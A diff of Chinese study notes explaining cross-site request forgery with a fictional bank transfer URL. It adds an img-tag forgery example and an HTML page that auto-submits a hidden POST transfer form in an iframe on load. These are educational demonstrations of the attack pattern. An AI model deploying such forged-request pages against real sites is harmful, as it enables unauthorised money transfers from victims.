@@ -11,11 +11,35 @@ CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也�
 用户切换标签登录到一个不安全的网站，该网站便会有机会通过js的referer 拿到工行的地址和 其它一些信息 并伪造请求
 
 示例1：
-用户在工行付费连接
+#用户在工行付费连接
 http://www.mybank.com/Transfer.php?toBankId=11&money=1000
 
-然后访问危险网站，网站会根据js生成
+然后访问危险网站，网站会根据document.referer生成
 <img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
 当图片加载完后 用户的付费连接访问了2次，多付费1000
 
 这种情况需要用post请求避免，而且后台必须要用$_POST而不是$_REQUEST
+#http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html
+#危险网站新代码，使用form发送post请求
+<html>
+　　<head>
+　　　　<script type="text/javascript">
+　　　　　　function steal()
+　　　　　　{
+          　　　　 iframe = document.frames["steal"];
+　　     　　      iframe.document.Submit("transfer");
+　　　　　　}
+　　　　</script>
+　　</head>
+
+　　<body onload="steal()">
+　　　　<iframe name="steal" display="none">
+　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
+　　　　　　　　<input type="hidden" name="toBankId" value="11">
+　　　　　　　　<input type="hidden" name="money" value="1000">
+　　　　　　</form>
+　　　　</iframe>
+　　</body>
+</html>
+
+
